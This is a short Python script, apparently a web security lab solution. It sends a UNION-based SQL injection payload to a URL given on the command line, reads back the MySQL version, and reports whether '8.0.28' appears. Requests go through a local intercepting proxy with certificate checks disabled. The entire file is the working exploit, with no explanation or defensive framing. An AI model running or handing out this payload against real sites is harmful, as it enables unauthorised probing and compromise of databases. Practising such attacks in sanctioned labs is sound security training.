import sys, urllib3, requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli(url):
    payload = "'+union+select+null,+@@version+--+"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    return '8.0.28' in r.text


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except:
        print('[*] Usage: %s <url>' % sys.argv[0])
        print('[*] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    print(sqli(url))
    